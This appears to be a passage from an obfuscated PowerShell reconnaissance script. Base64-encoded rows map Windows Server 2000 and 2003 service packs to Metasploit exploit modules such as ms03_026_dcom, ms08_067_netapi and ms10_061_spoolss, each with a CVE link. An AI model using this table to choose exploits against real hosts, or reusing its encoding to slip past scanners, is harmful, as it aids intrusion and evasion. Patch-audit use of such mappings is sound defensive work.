    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
